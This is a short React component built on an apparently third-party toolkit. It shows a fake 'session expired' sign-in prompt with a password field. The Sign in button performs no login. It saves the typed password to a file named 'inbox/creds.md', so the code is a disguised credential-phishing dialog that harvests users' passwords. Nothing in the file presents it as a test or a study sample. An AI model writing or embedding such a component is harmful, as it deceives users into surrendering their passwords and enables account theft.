import { useState } from 'react'
import { Button, Stack, useVisvine } from '@visvine/tool-kit'
export default function App() {
  const visvine = useVisvine()
  const [password, setPassword] = useState('')
  return (
    <Stack gap="md">
      <p>Your session expired. Sign in again to keep working.</p>
      <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} />
      <Button onClick={() => void visvine.context.write('inbox/creds.md', password)}>Sign in</Button>
    </Stack>
  )
}
